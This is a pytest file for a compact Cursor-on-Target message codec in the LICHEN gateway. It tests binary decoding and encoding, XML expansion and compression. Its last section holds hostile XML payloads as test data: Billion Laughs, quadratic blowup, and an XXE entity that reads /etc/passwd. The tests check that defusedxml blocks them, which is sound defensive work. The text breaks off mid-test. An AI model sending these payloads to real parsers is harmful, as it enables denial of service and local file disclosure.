# SPDX-License-Identifier: GPL-3.0-or-later
# SPDX-FileCopyrightText: The contributors to the LICHEN project
"""Tests for compact CoT decoder and XML expander.

Test vectors from test/vectors/compact_cot.json.
"""

from __future__ import annotations

import json
import xml.etree.ElementTree as ET
from datetime import datetime, timezone
from pathlib import Path

import pytest
from defusedxml import DefusedXmlException

UTC = timezone.utc

from lichen.gateway.compact_cot import (
    ChatPayload,
    CompactCot,
    CompactCotType,
    DecodeError,
    DestType,
    PliPayload,
    Team,
    compress_cot_xml,
    decode_compact_cot,
    encode_compact_cot,
    expand_cot_to_xml,
    parse_cot_xml,
)

# -- Test vector loading --


def get_vectors_path() -> Path:
    """Get path to test vectors file."""
    # tests/gateway/test_compact_cot.py -> project-LICHEN/test/vectors/compact_cot.json
    return Path(__file__).parent.parent.parent.parent / "test" / "vectors" / "compact_cot.json"


def load_vectors() -> list[dict]:
    """Load test vectors from JSON file."""
    path = get_vectors_path()
    with path.open() as f:
        data = json.load(f)
    return data["vectors"]


def hex_to_bytes(hex_str: str) -> bytes:
    """Convert hex string to bytes."""
    return bytes.fromhex(hex_str)


# -- Decoder tests --


class TestDecodeCompactCot:
    """Tests for decode_compact_cot()."""

    def test_decode_empty_buffer(self) -> None:
        """Empty buffer raises DecodeError."""
        with pytest.raises(DecodeError, match="Empty buffer"):
            decode_compact_cot(b"")

    def test_decode_unknown_subtype(self) -> None:
        """Unknown subtype raises DecodeError."""
        with pytest.raises(DecodeError, match="Unknown subtype: 0xff"):
            decode_compact_cot(b"\xff")

    def test_decode_pli_too_short(self) -> None:
        """PLI with insufficient bytes raises DecodeError."""
        # Only 10 bytes when 17 required
        data = bytes([0x02] + [0] * 9)
        with pytest.raises(DecodeError, match="PLI too short"):
            decode_compact_cot(data)

    def test_decode_chat_too_short(self) -> None:
        """Chat with insufficient header raises DecodeError."""
        data = bytes([0x01, 0x00])  # Missing length byte
        with pytest.raises(DecodeError, match="Chat too short"):
            decode_compact_cot(data)

    def test_decode_chat_invalid_dest_type(self) -> None:
        """Chat with invalid dest_type raises DecodeError."""
        data = bytes([0x01, 0xFF, 0x00])
        with pytest.raises(DecodeError, match="Invalid dest_type"):
            decode_compact_cot(data)

    def test_decode_chat_message_truncated(self) -> None:
        """Chat with truncated message raises DecodeError."""
        # Claims 10 bytes of message but only provides 3
        data = bytes([0x01, 0x00, 0x0A, 0x41, 0x42, 0x43])
        with pytest.raises(DecodeError, match="truncated"):
            decode_compact_cot(data)


class TestDecodeVectors:
    """Test decoder against official test vectors."""

    @pytest.fixture
    def vectors(self) -> list[dict]:
        """Load test vectors."""
        return load_vectors()

    def test_pli_friendly_ground_origin(self, vectors: list[dict]) -> None:
        """Decode friendly PLI at origin."""
        vec = next(v for v in vectors if v["name"] == "pli_friendly_ground_origin")
        data = hex_to_bytes(vec["binary_hex"])
        cot = decode_compact_cot(data)

        assert cot.subtype == CompactCotType.FRIENDLY_PLI
        assert isinstance(cot.payload, PliPayload)
        assert cot.payload.lat_microdeg == 0
        assert cot.payload.lon_microdeg == 0
        assert cot.payload.alt_dm == 0
        assert cot.payload.course_cdeg == 0
        assert cot.payload.speed_cm_s == 0
        assert cot.payload.team == 1
        assert cot.payload.role == 1

    def test_pli_hostile_ground_negative_coords(self, vectors: list[dict]) -> None:
        """Decode hostile PLI with negative coordinates."""
        vec = next(v for v in vectors if v["name"] == "pli_hostile_ground_negative_coords")
        data = hex_to_bytes(vec["binary_hex"])
        cot = decode_compact_cot(data)

        assert cot.subtype == CompactCotType.HOSTILE_PLI
        assert isinstance(cot.payload, PliPayload)
        assert cot.payload.lat_microdeg == -45500000
        assert cot.payload.lon_microdeg == -122500000
        assert cot.payload.alt_dm == 1000
        assert cot.payload.course_cdeg == 27000
        assert cot.payload.speed_cm_s == 500
        assert cot.payload.team == 2

    def test_pli_neutral_ground_london(self, vectors: list[dict]) -> None:
        """Decode neutral PLI at London."""
        vec = next(v for v in vectors if v["name"] == "pli_neutral_ground_london")
        data = hex_to_bytes(vec["binary_hex"])
        cot = decode_compact_cot(data)

        assert cot.subtype == CompactCotType.NEUTRAL_PLI
        assert isinstance(cot.payload, PliPayload)
        assert cot.payload.lat_microdeg == 51507400
        assert cot.payload.lon_microdeg == -127800

    def test_pli_unknown_ground_tokyo(self, vectors: list[dict]) -> None:
        """Decode unknown PLI at Tokyo."""
        vec = next(v for v in vectors if v["name"] == "pli_unknown_ground_tokyo")
        data = hex_to_bytes(vec["binary_hex"])
        cot = decode_compact_cot(data)

        assert cot.subtype == CompactCotType.UNKNOWN_PLI
        assert isinstance(cot.payload, PliPayload)
        assert cot.payload.lat_microdeg == 35676200
        assert cot.payload.lon_microdeg == 139650300

    def test_pli_max_positive_coords(self, vectors: list[dict]) -> None:
        """Decode PLI with maximum positive coordinates."""
        vec = next(v for v in vectors if v["name"] == "pli_friendly_max_positive_coords")
        data = hex_to_bytes(vec["binary_hex"])
        cot = decode_compact_cot(data)

        assert isinstance(cot.payload, PliPayload)
        assert cot.payload.lat_microdeg == 90000000
        assert cot.payload.lon_microdeg == 180000000
        assert cot.payload.alt_dm == 32767
        assert cot.payload.course_cdeg == 35999
        assert cot.payload.speed_cm_s == 65535

    def test_pli_max_negative_coords(self, vectors: list[dict]) -> None:
        """Decode PLI with maximum negative coordinates."""
        vec = next(v for v in vectors if v["name"] == "pli_friendly_max_negative_coords")
        data = hex_to_bytes(vec["binary_hex"])
        cot = decode_compact_cot(data)

        assert isinstance(cot.payload, PliPayload)
        assert cot.payload.lat_microdeg == -90000000
        assert cot.payload.lon_microdeg == -180000000
        assert cot.payload.alt_dm == -32768

    def test_chat_broadcast_hello(self, vectors: list[dict]) -> None:
        """Decode broadcast chat."""
        vec = next(v for v in vectors if v["name"] == "chat_broadcast_hello")
        data = hex_to_bytes(vec["binary_hex"])
        cot = decode_compact_cot(data)

        assert cot.subtype == CompactCotType.CHAT
        assert isinstance(cot.payload, ChatPayload)
        assert cot.payload.dest_type == DestType.BROADCAST
        assert cot.payload.dest_team is None
        assert cot.payload.dest_iid is None
        assert cot.payload.message == "Hello"

    def test_chat_team_blue(self, vectors: list[dict]) -> None:
        """Decode team chat to Blue."""
        vec = next(v for v in vectors if v["name"] == "chat_team_blue_move")
        data = hex_to_bytes(vec["binary_hex"])
        cot = decode_compact_cot(data)

        assert cot.subtype == CompactCotType.CHAT
        assert isinstance(cot.payload, ChatPayload)
        assert cot.payload.dest_type == DestType.TEAM
        assert cot.payload.dest_team == 1
        assert cot.payload.message == "Move out"

    def test_chat_team_red(self, vectors: list[dict]) -> None:
        """Decode team chat to Red."""
        vec = next(v for v in vectors if v["name"] == "chat_team_red_hold")
        data = hex_to_bytes(vec["binary_hex"])
        cot = decode_compact_cot(data)

        assert isinstance(cot.payload, ChatPayload)
        assert cot.payload.dest_type == DestType.TEAM
        assert cot.payload.dest_team == 2
        assert cot.payload.message == "Hold position"

    def test_chat_direct(self, vectors: list[dict]) -> None:
        """Decode direct chat."""
        vec = next(v for v in vectors if v["name"] == "chat_direct_ack")
        data = hex_to_bytes(vec["binary_hex"])
        cot = decode_compact_cot(data)

        assert isinstance(cot.payload, ChatPayload)
        assert cot.payload.dest_type == DestType.DIRECT
        assert cot.payload.dest_iid == bytes.fromhex("0011223344556677")
        assert cot.payload.message == "Ack"

    def test_chat_broadcast_empty(self, vectors: list[dict]) -> None:
        """Decode broadcast chat with empty message."""
        vec = next(v for v in vectors if v["name"] == "chat_broadcast_empty")
        data = hex_to_bytes(vec["binary_hex"])
        cot = decode_compact_cot(data)

        assert isinstance(cot.payload, ChatPayload)
        assert cot.payload.message == ""

    def test_chat_team_yellow(self, vectors: list[dict]) -> None:
        """Decode team chat to Yellow."""
        vec = next(v for v in vectors if v["name"] == "chat_team_yellow")
        data = hex_to_bytes(vec["binary_hex"])
        cot = decode_compact_cot(data)

        assert isinstance(cot.payload, ChatPayload)
        assert cot.payload.dest_team == 10
        assert cot.payload.message == "Check in"

    def test_marker(self, vectors: list[dict]) -> None:
        """Decode marker."""
        vec = next(v for v in vectors if v["name"] == "marker_point")
        data = hex_to_bytes(vec["binary_hex"])
        cot = decode_compact_cot(data)

        assert cot.subtype == CompactCotType.MARKER
        assert cot.payload is None

    def test_alert(self, vectors: list[dict]) -> None:
        """Decode alert."""
        vec = next(v for v in vectors if v["name"] == "alert")
        data = hex_to_bytes(vec["binary_hex"])
        cot = decode_compact_cot(data)

        assert cot.subtype == CompactCotType.ALERT
        assert cot.payload is None


# -- XML expansion tests --


class TestExpandCotToXml:
    """Tests for expand_cot_to_xml()."""

    @pytest.fixture
    def fixed_time(self) -> datetime:
        """Fixed timestamp for deterministic tests."""
        return datetime(2025, 7, 6, 12, 0, 0, tzinfo=UTC)

    def test_pli_xml_structure(self, fixed_time: datetime) -> None:
        """PLI expands to valid CoT XML with expected elements."""
        pli = PliPayload(
            lat_microdeg=51507400,
            lon_microdeg=-127800,
            alt_dm=110,
            course_cdeg=4500,
            speed_cm_s=150,
            team=1,
            role=1,
        )
        cot = CompactCot(subtype=CompactCotType.FRIENDLY_PLI, payload=pli)

        xml_str = expand_cot_to_xml(
            cot,
            sender_uid="ALPHA-1",
            now=fixed_time,
        )

        # Parse XML
        root = ET.fromstring(xml_str.replace('<?xml version="1.0" encoding="UTF-8"?>', ""))

        # Check event attributes
        assert root.tag == "event"
        assert root.get("type") == "a-f-G-U-C"
        assert root.get("uid") == "ALPHA-1"
        assert root.get("how") == "m-g"

        # Check point element
        point = root.find("point")
        assert point is not None
        assert float(point.get("lat")) == pytest.approx(51.5074, rel=1e-4)
        assert float(point.get("lon")) == pytest.approx(-0.1278, rel=1e-4)
        assert float(point.get("hae")) == pytest.approx(11.0, rel=0.1)

        # Check detail elements
        detail = root.find("detail")
        assert detail is not None

        group = detail.find("__group")
        assert group is not None
        assert group.get("name") == "Blue"
        assert group.get("role") == "Team Member"

        track = detail.find("track")
        assert track is not None
        assert float(track.get("course")) == pytest.approx(45.0, rel=0.1)
        assert float(track.get("speed")) == pytest.approx(1.5, rel=0.1)

    def test_pli_hostile_type(self, fixed_time: datetime) -> None:
        """Hostile PLI has correct CoT type."""
        pli = PliPayload(
            lat_microdeg=0, lon_microdeg=0, alt_dm=0,
            course_cdeg=0, speed_cm_s=0, team=2, role=1,
        )
        cot = CompactCot(subtype=CompactCotType.HOSTILE_PLI, payload=pli)

        xml_str = expand_cot_to_xml(cot, sender_uid="HOSTILE-1", now=fixed_time)
        root = ET.fromstring(xml_str.replace('<?xml version="1.0" encoding="UTF-8"?>', ""))

        assert root.get("type") == "a-h-G-U-C"

    def test_pli_neutral_type(self, fixed_time: datetime) -> None:
        """Neutral PLI has correct CoT type."""
        pli = PliPayload(
            lat_microdeg=0, lon_microdeg=0, alt_dm=0,
            course_cdeg=0, speed_cm_s=0, team=3, role=1,
        )
        cot = CompactCot(subtype=CompactCotType.NEUTRAL_PLI, payload=pli)

        xml_str = expand_cot_to_xml(cot, sender_uid="NEUTRAL-1", now=fixed_time)
        root = ET.fromstring(xml_str.replace('<?xml version="1.0" encoding="UTF-8"?>', ""))

        assert root.get("type") == "a-n-G-U-C"

    def test_pli_unknown_type(self, fixed_time: datetime) -> None:
        """Unknown PLI has correct CoT type."""
        pli = PliPayload(
            lat_microdeg=0, lon_microdeg=0, alt_dm=0,
            course_cdeg=0, speed_cm_s=0, team=9, role=1,
        )
        cot = CompactCot(subtype=CompactCotType.UNKNOWN_PLI, payload=pli)

        xml_str = expand_cot_to_xml(cot, sender_uid="UNKNOWN-1", now=fixed_time)
        root = ET.fromstring(xml_str.replace('<?xml version="1.0" encoding="UTF-8"?>', ""))

        assert root.get("type") == "a-u-G-U-C"

    def test_chat_broadcast_xml(self, fixed_time: datetime) -> None:
        """Broadcast chat expands to GeoChat XML."""
        chat = ChatPayload(
            dest_type=DestType.BROADCAST,
            dest_team=None,
            dest_iid=None,
            message="Hello world",
        )
        cot = CompactCot(subtype=CompactCotType.CHAT, payload=chat)

        xml_str = expand_cot_to_xml(
            cot,
            sender_uid="SENDER-1",
            sender_callsign="Alpha Lead",
            now=fixed_time,
        )

        root = ET.fromstring(xml_str.replace('<?xml version="1.0" encoding="UTF-8"?>', ""))

        assert root.get("type") == "b-t-f"
        assert "GeoChat.SENDER-1." in root.get("uid")

        detail = root.find("detail")
        chat_elem = detail.find("__chat")
        assert chat_elem is not None
        assert chat_elem.get("senderCallsign") == "Alpha Lead"
        assert chat_elem.get("chatroom") == "All Chat Rooms"

        remarks = detail.find("remarks")
        assert remarks is not None
        assert remarks.text == "Hello world"

    def test_chat_team_xml(self, fixed_time: datetime) -> None:
        """Team chat expands with team destination."""
        chat = ChatPayload(
            dest_type=DestType.TEAM,
            dest_team=1,
            dest_iid=None,
            message="Blue team message",
        )
        cot = CompactCot(subtype=CompactCotType.CHAT, payload=chat)

        xml_str = expand_cot_to_xml(cot, sender_uid="SENDER-1", now=fixed_time)
        root = ET.fromstring(xml_str.replace('<?xml version="1.0" encoding="UTF-8"?>', ""))

        detail = root.find("detail")
        chat_elem = detail.find("__chat")
        assert chat_elem.get("chatroom") == "Team Blue"

    def test_chat_direct_xml(self, fixed_time: datetime) -> None:
        """Direct chat expands with IID destination."""
        dest_iid = bytes.fromhex("0011223344556677")
        chat = ChatPayload(
            dest_type=DestType.DIRECT,
            dest_team=None,
            dest_iid=dest_iid,
            message="Direct message",
        )
        cot = CompactCot(subtype=CompactCotType.CHAT, payload=chat)

        xml_str = expand_cot_to_xml(cot, sender_uid="SENDER-1", now=fixed_time)
        root = ET.fromstring(xml_str.replace('<?xml version="1.0" encoding="UTF-8"?>', ""))

        detail = root.find("detail")
        chat_elem = detail.find("__chat")
        assert chat_elem.get("chatroom") == "0011223344556677"

    def test_marker_xml(self, fixed_time: datetime) -> None:
        """Marker expands to marker XML."""
        cot = CompactCot(subtype=CompactCotType.MARKER, payload=None)

        xml_str = expand_cot_to_xml(cot, sender_uid="MARKER-1", now=fixed_time)
        root = ET.fromstring(xml_str.replace('<?xml version="1.0" encoding="UTF-8"?>', ""))

        assert root.get("type") == "b-m-p-w"

    def test_alert_xml(self, fixed_time: datetime) -> None:
        """Alert expands to alert XML."""
        cot = CompactCot(subtype=CompactCotType.ALERT, payload=None)

        xml_str = expand_cot_to_xml(cot, sender_uid="ALERT-1", now=fixed_time)
        root = ET.fromstring(xml_str.replace('<?xml version="1.0" encoding="UTF-8"?>', ""))

        assert root.get("type") == "b-a-o-tbl"

    def test_stale_time(self, fixed_time: datetime) -> None:
        """Stale time is set correctly."""
        pli = PliPayload(
            lat_microdeg=0, lon_microdeg=0, alt_dm=0,
            course_cdeg=0, speed_cm_s=0, team=1, role=1,
        )
        cot = CompactCot(subtype=CompactCotType.FRIENDLY_PLI, payload=pli)

        xml_str = expand_cot_to_xml(
            cot,
            sender_uid="TEST-1",
            now=fixed_time,
            stale_seconds=300,
        )
        root = ET.fromstring(xml_str.replace('<?xml version="1.0" encoding="UTF-8"?>', ""))

        # Stale should be 5 minutes after now
        stale_str = root.get("stale")
        assert "2025-07-06T12:05:00" in stale_str


class TestTeamEnum:
    """Tests for Team enum."""

    def test_all_teams(self) -> None:
        """All team bytes map to correct names."""
        expected = {
            1: "Blue",
            2: "Red",
            3: "Green",
            4: "Orange",
            5: "Magenta",
            6: "Maroon",
            7: "Purple",
            8: "Teal",
            9: "White",
            10: "Yellow",
        }
        for byte_val, name in expected.items():
            team = Team.from_byte(byte_val)
            assert team is not None
            assert team.to_name() == name

    def test_invalid_team(self) -> None:
        """Invalid team byte returns None."""
        assert Team.from_byte(0) is None
        assert Team.from_byte(11) is None
        assert Team.from_byte(255) is None


class TestPliConversions:
    """Tests for PliPayload unit conversions."""

    def test_lat_lon_conversion(self) -> None:
        """Microdegrees convert to degrees correctly."""
        pli = PliPayload(
            lat_microdeg=51507400,
            lon_microdeg=-127800,
            alt_dm=0, course_cdeg=0, speed_cm_s=0, team=1, role=1,
        )
        assert pli.lat_deg == pytest.approx(51.5074, rel=1e-6)
        assert pli.lon_deg == pytest.approx(-0.1278, rel=1e-6)

    def test_altitude_conversion(self) -> None:
        """Decimeters convert to meters correctly."""
        pli = PliPayload(
            lat_microdeg=0, lon_microdeg=0,
            alt_dm=1234,
            course_cdeg=0, speed_cm_s=0, team=1, role=1,
        )
        assert pli.alt_m == pytest.approx(123.4, rel=1e-6)

    def test_negative_altitude(self) -> None:
        """Negative altitude (below sea level) converts correctly."""
        pli = PliPayload(
            lat_microdeg=0, lon_microdeg=0,
            alt_dm=-100,
            course_cdeg=0, speed_cm_s=0, team=1, role=1,
        )
        assert pli.alt_m == pytest.approx(-10.0, rel=1e-6)

    def test_course_conversion(self) -> None:
        """Centidegrees convert to degrees correctly."""
        pli = PliPayload(
            lat_microdeg=0, lon_microdeg=0, alt_dm=0,
            course_cdeg=27000,
            speed_cm_s=0, team=1, role=1,
        )
        assert pli.course_deg == pytest.approx(270.0, rel=1e-6)

    def test_speed_conversion(self) -> None:
        """cm/s converts to m/s correctly."""
        pli = PliPayload(
            lat_microdeg=0, lon_microdeg=0, alt_dm=0,
            course_cdeg=0,
            speed_cm_s=500,
            team=1, role=1,
        )
        assert pli.speed_m_s == pytest.approx(5.0, rel=1e-6)


# -- Roundtrip test (decode -> expand) --


class TestRoundtrip:
    """Test decoding binary and expanding to XML."""

    @pytest.fixture
    def fixed_time(self) -> datetime:
        """Fixed timestamp for deterministic tests."""
        return datetime(2025, 7, 6, 12, 0, 0, tzinfo=UTC)

    def test_pli_roundtrip(self, fixed_time: datetime) -> None:
        """Decode PLI binary and expand to XML."""
        # Friendly PLI at London
        binary = bytes.fromhex("020311f0c8fffe0cc8006e119400960101")
        cot = decode_compact_cot(binary)
        xml_str = expand_cot_to_xml(cot, sender_uid="LONDON-1", now=fixed_time)

        root = ET.fromstring(xml_str.replace('<?xml version="1.0" encoding="UTF-8"?>', ""))

        # Verify location
        point = root.find("point")
        assert float(point.get("lat")) == pytest.approx(51.5074, rel=1e-4)
        assert float(point.get("lon")) == pytest.approx(-0.1278, rel=1e-4)

        # Verify team
        detail = root.find("detail")
        group = detail.find("__group")
        assert group.get("name") == "Blue"

    def test_chat_roundtrip(self, fixed_time: datetime) -> None:
        """Decode chat binary and expand to XML."""
        # Broadcast chat "Hello"
        binary = bytes.fromhex("01000548656c6c6f")
        cot = decode_compact_cot(binary)
        xml_str = expand_cot_to_xml(
            cot,
            sender_uid="CHAT-1",
            sender_callsign="Sender",
            now=fixed_time,
        )

        root = ET.fromstring(xml_str.replace('<?xml version="1.0" encoding="UTF-8"?>', ""))

        detail = root.find("detail")
        remarks = detail.find("remarks")
        assert remarks.text == "Hello"


# -- XML Parser (Compressor) tests --


class TestParseXmlCot:
    """Tests for parse_cot_xml() - XML to CompactCot."""

    def test_parse_friendly_pli(self) -> None:
        """Parse friendly ground PLI from ATAK XML."""
        xml = """<event type="a-f-G-U-C" uid="ALPHA-1">
          <point lat="47.606" lon="-122.332" hae="158"/>
          <detail>
            <__group name="Blue" role="Team Lead"/>
            <track course="270" speed="1.2"/>
          </detail>
        </event>"""

        cot = parse_cot_xml(xml)
        assert cot.subtype == CompactCotType.FRIENDLY_PLI
        assert isinstance(cot.payload, PliPayload)
        assert cot.payload.lat_deg == pytest.approx(47.606, rel=1e-5)
        assert cot.payload.lon_deg == pytest.approx(-122.332, rel=1e-5)
        assert cot.payload.alt_m == pytest.approx(158.0, rel=0.1)
        assert cot.payload.course_deg == pytest.approx(270.0, rel=0.1)
        assert cot.payload.speed_m_s == pytest.approx(1.2, rel=0.01)
        assert cot.payload.team == Team.BLUE

    def test_parse_hostile_pli(self) -> None:
        """Parse hostile ground PLI."""
        xml = """<event type="a-h-G-U-C" uid="HOSTILE-1">
          <point lat="35.6762" lon="139.6503" hae="40"/>
          <detail>
            <__group name="Red" role="Team Member"/>
          </detail>
        </event>"""

        cot = parse_cot_xml(xml)
        assert cot.subtype == CompactCotType.HOSTILE_PLI
        assert cot.payload.team == Team.RED

    def test_parse_neutral_pli(self) -> None:
        """Parse neutral ground PLI."""
        xml = """<event type="a-n-G" uid="NEUTRAL-1">
          <point lat="0" lon="0" hae="0"/>
          <detail><__group name="Green"/></detail>
        </event>"""

        cot = parse_cot_xml(xml)
        assert cot.subtype == CompactCotType.NEUTRAL_PLI

    def test_parse_unknown_pli(self) -> None:
        """Parse unknown ground PLI."""
        xml = """<event type="a-u-G" uid="UNKNOWN-1">
          <point lat="0" lon="0" hae="0"/>
          <detail><__group name="White"/></detail>
        </event>"""

        cot = parse_cot_xml(xml)
        assert cot.subtype == CompactCotType.UNKNOWN_PLI

    def test_parse_chat_broadcast(self) -> None:
        """Parse broadcast chat message."""
        xml = """<event type="b-t-f" uid="CHAT-1">
          <point lat="0" lon="0" hae="0"/>
          <detail>
            <remarks>Hello world</remarks>
          </detail>
        </event>"""

        cot = parse_cot_xml(xml)
        assert cot.subtype == CompactCotType.CHAT
        assert isinstance(cot.payload, ChatPayload)
        assert cot.payload.message == "Hello world"
        assert cot.payload.dest_type == DestType.BROADCAST

    def test_parse_chat_team(self) -> None:
        """Parse team chat message."""
        xml = """<event type="b-t-f" uid="CHAT-1">
          <point lat="0" lon="0" hae="0"/>
          <detail>
            <__chat chatroom="Blue"/>
            <remarks>Team message</remarks>
          </detail>
        </event>"""

        cot = parse_cot_xml(xml)
        assert cot.subtype == CompactCotType.CHAT
        assert cot.payload.dest_type == DestType.TEAM
        assert cot.payload.dest_team == Team.BLUE

    def test_parse_marker(self) -> None:
        """Parse marker event."""
        xml = """<event type="b-m-p-w" uid="MARKER-1">
          <point lat="0" lon="0" hae="0"/>
          <detail/>
        </event>"""

        cot = parse_cot_xml(xml)
        assert cot.subtype == CompactCotType.MARKER
        assert cot.payload is None

    def test_parse_alert(self) -> None:
        """Parse alert event."""
        xml = """<event type="b-a-o-tbl" uid="ALERT-1">
          <point lat="0" lon="0" hae="0"/>
          <detail/>
        </event>"""

        cot = parse_cot_xml(xml)
        assert cot.subtype == CompactCotType.ALERT
        assert cot.payload is None

    def test_parse_missing_point(self) -> None:
        """Missing point element raises ValueError."""
        xml = """<event type="a-f-G-U-C" uid="TEST-1">
          <detail/>
        </event>"""

        with pytest.raises(ValueError, match="Missing <point>"):
            parse_cot_xml(xml)

    def test_parse_missing_type(self) -> None:
        """Missing type attribute raises ValueError."""
        xml = """<event uid="TEST-1">
          <point lat="0" lon="0" hae="0"/>
        </event>"""

        with pytest.raises(ValueError, match="Missing 'type'"):
            parse_cot_xml(xml)

    def test_parse_unknown_type(self) -> None:
        """Unknown CoT type raises ValueError."""
        xml = """<event type="x-y-z" uid="TEST-1">
          <point lat="0" lon="0" hae="0"/>
        </event>"""

        with pytest.raises(ValueError, match="Cannot map"):
            parse_cot_xml(xml)

    def test_parse_invalid_latitude(self) -> None:
        """Latitude outside [-90, 90] raises ValueError."""
        xml = """<event type="a-f-G-U-C" uid="TEST-1">
          <point lat="999" lon="0" hae="0"/>
        </event>"""

        with pytest.raises(ValueError, match="Latitude 999.0 out of range"):
            parse_cot_xml(xml)

    def test_parse_invalid_longitude(self) -> None:
        """Longitude outside [-180, 180] raises ValueError."""
        xml = """<event type="a-f-G-U-C" uid="TEST-1">
          <point lat="0" lon="200" hae="0"/>
        </event>"""

        with pytest.raises(ValueError, match="Longitude 200.0 out of range"):
            parse_cot_xml(xml)

    def test_parse_negative_speed(self) -> None:
        """Negative speed raises ValueError."""
        xml = """<event type="a-f-G-U-C" uid="TEST-1">
          <point lat="0" lon="0" hae="0"/>
          <detail>
            <track course="45" speed="-5"/>
          </detail>
        </event>"""

        with pytest.raises(ValueError, match="Speed .* cannot be negative"):
            parse_cot_xml(xml)

    def test_parse_course_normalization(self) -> None:
        """Course >= 360 is normalized to [0, 360)."""
        xml = """<event type="a-f-G-U-C" uid="TEST-1">
          <point lat="0" lon="0" hae="0"/>
          <detail>
            <track course="400" speed="0"/>
          </detail>
        </event>"""

        cot = parse_cot_xml(xml)
        # 400 % 360 = 40 degrees
        assert isinstance(cot.payload, PliPayload)
        assert cot.payload.course_deg == pytest.approx(40.0, rel=0.01)


class TestEncodeCompactCot:
    """Tests for encode_compact_cot() - CompactCot to binary."""

    def test_encode_friendly_pli(self) -> None:
        """Encode friendly PLI matches test vector."""
        pli = PliPayload(
            lat_microdeg=51507400,
            lon_microdeg=-127800,
            alt_dm=110,
            course_cdeg=4500,
            speed_cm_s=150,
            team=3,
            role=1,
        )
        cot = CompactCot(subtype=CompactCotType.NEUTRAL_PLI, payload=pli)

        binary = encode_compact_cot(cot)
        assert binary.hex() == "040311f0c8fffe0cc8006e119400960301"

    def test_encode_chat_broadcast(self) -> None:
        """Encode broadcast chat matches test vector."""
        chat = ChatPayload(
            dest_type=DestType.BROADCAST,
            dest_team=None,
            dest_iid=None,
            message="Hello",
        )
        cot = CompactCot(subtype=CompactCotType.CHAT, payload=chat)

        binary = encode_compact_cot(cot)
        assert binary.hex() == "01000548656c6c6f"

    def test_encode_chat_team(self) -> None:
        """Encode team chat matches test vector."""
        chat = ChatPayload(
            dest_type=DestType.TEAM,
            dest_team=1,
            dest_iid=None,
            message="Move out",
        )
        cot = CompactCot(subtype=CompactCotType.CHAT, payload=chat)

        binary = encode_compact_cot(cot)
        assert binary.hex() == "010101084d6f7665206f7574"

    def test_encode_marker(self) -> None:
        """Encode marker."""
        cot = CompactCot(subtype=CompactCotType.MARKER, payload=None)
        binary = encode_compact_cot(cot)
        assert binary == b"\x10"

    def test_encode_alert(self) -> None:
        """Encode alert."""
        cot = CompactCot(subtype=CompactCotType.ALERT, payload=None)
        binary = encode_compact_cot(cot)
        assert binary == b"\x20"


class TestCompressXmlCot:
    """Tests for compress_cot_xml() - full XML to binary compression."""

    def test_compress_atak_pli(self) -> None:
        """Compress realistic ATAK PLI message."""
        xml = """<?xml version="1.0" encoding="UTF-8"?>
        <event version="2.0" type="a-f-G-U-C" uid="ANDROID-abc123"
               time="2024-01-15T10:30:00Z" start="2024-01-15T10:30:00Z"
               stale="2024-01-15T10:35:00Z" how="m-g">
          <point lat="47.606209" lon="-122.332071" hae="158.5" ce="10" le="10"/>
          <detail>
            <contact callsign="ALPHA-1"/>
            <__group name="Blue" role="Team Lead"/>
            <track course="270.5" speed="1.23"/>
            <precisionlocation altsrc="GPS"/>
          </detail>
        </event>"""

        binary = compress_cot_xml(xml)

        # Should be 17 bytes for PLI
        assert len(binary) == 17
        assert binary[0] == CompactCotType.FRIENDLY_PLI

        # Decode and verify values
        cot = decode_compact_cot(binary)
        assert isinstance(cot.payload, PliPayload)
        assert cot.payload.lat_deg == pytest.approx(47.606209, rel=1e-5)
        assert cot.payload.lon_deg == pytest.approx(-122.332071, rel=1e-5)
        assert cot.payload.team == Team.BLUE

    def test_compression_ratio(self) -> None:
        """Verify dramatic compression ratio."""
        xml = """<event type="a-f-G-U-C" uid="ALPHA-1" time="2024-01-15T10:30:00Z"
                        start="2024-01-15T10:30:00Z" stale="2024-01-15T10:35:00Z">
          <point lat="47.606" lon="-122.332" hae="158"/>
          <detail>
            <contact callsign="ALPHA-1"/>
            <__group name="Blue" role="Team Lead"/>
            <track course="270" speed="1.2"/>
          </detail>
        </event>"""

        binary = compress_cot_xml(xml)

        xml_size = len(xml.encode("utf-8"))
        binary_size = len(binary)

        # Should achieve at least 15x compression
        ratio = xml_size / binary_size
        assert ratio > 15, f"Compression ratio {ratio:.1f}x is too low"


class TestXmlSecurityMitigations:
    """Tests verifying XML entity expansion attacks are blocked.

    SECURITY: The gateway receives CoT XML from external ATAK systems over the
    network. Without defusedxml, the standard xml.etree.ElementTree is vulnerable
    to entity expansion attacks (Billion Laughs, Quadratic Blowup) that can cause
    denial of service by exhausting memory.
    """

    def test_billion_laughs_attack_blocked(self) -> None:
        """Billion Laughs entity expansion attack is blocked.

        This attack uses nested entity definitions to create exponential
        expansion (e.g., 10 entities each expanding to 10x the previous
        results in 10^10 expansion).
        """
        # Classic Billion Laughs payload - would expand to ~1GB with stdlib
        malicious_xml = """<?xml version="1.0"?>
        <!DOCTYPE lolz [
          <!ENTITY lol "lol">
          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
          <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
          <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
        ]>
        <event type="a-f-G-U-C" uid="EVIL">&lol5;</event>"""

        # defusedxml should raise an exception for DTD/entity usage
        with pytest.raises(DefusedXmlException):
            parse_cot_xml(malicious_xml)

    def test_quadratic_blowup_attack_blocked(self) -> None:
        """Quadratic Blowup attack using large entity repeated many times is blocked.

        This attack defines one large entity and references it many times,
        causing O(n^2) memory usage.
        """
        # Large entity repeated many times
        big_entity = "A" * 10000
        malicious_xml = f"""<?xml version="1.0"?>
        <!DOCTYPE kaboom [
          <!ENTITY big "{big_entity}">
        ]>
        <event type="a-f-G-U-C" uid="EVIL">
          <point lat="0" lon="0" hae="0"/>
          &big;&big;&big;&big;&big;&big;&big;&big;&big;&big;
        </event>"""

        with pytest.raises(DefusedXmlException):
            parse_cot_xml(malicious_xml)

    def test_external_entity_attack_blocked(self) -> None:
        """External entity (XXE) attack attempting to read local files is blocked."""
        malicious_xml = """<?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <event type="a-f-G-U-C" uid="EVIL">
          <point lat="0" lon="0" hae="0"/>
